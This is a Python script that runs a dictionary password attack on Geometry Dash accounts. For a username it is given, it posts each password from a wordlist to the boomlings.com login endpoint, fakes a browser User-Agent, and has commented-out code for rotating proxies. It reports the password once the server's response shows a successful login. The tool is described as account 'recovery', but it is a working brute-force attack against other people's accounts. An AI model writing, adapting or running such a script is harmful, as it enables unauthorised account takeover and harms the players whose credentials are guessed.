import requests
import uuid
import tkinter as tk
from tkinter import filedialog

root = tk.Tk()
root.withdraw()

def Main(dictionary):
    uid = uuid.uuid4()
    passwords = []
    dictionary_selected = False

    # proxies = "proxies.txt"

    # with open(proxies, 'r') as f:
    #     lproxies = f.read().splitlines()

    try:
        if(dictionary):
            with open(dictionary, "r") as f:
                for line in f:
                    passwords.append(line.strip())

    except(Exception):
        print("No file found in that path, make sure you put the full path.")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36"
    }

    # for proxy in lproxies:
    #     proxy_dict = {
    #         'http': f'http://{proxy}',
    #         'https': f'https://{proxy}'
    #     }

    
    user = input("Enter the user to recover: ")

    for password in passwords:
        data = {
            "userName":user,
            "udid":uid,
            "password":password,
            "secret":"Wmfv3899gc9"
        }

        response = requests.post("http://www.boomlings.com/database/accounts/loginGJAccount.php", headers=headers, data=data, timeout=2.5)

        if "," in response.text:
            print("Password found!:", password)
            break

if __name__ == "__main__":
    print("Enter dictionary: ")
    dictionary = filedialog.askopenfilename()
    Main(dictionary=dictionary)
    input("Press any key to continue...")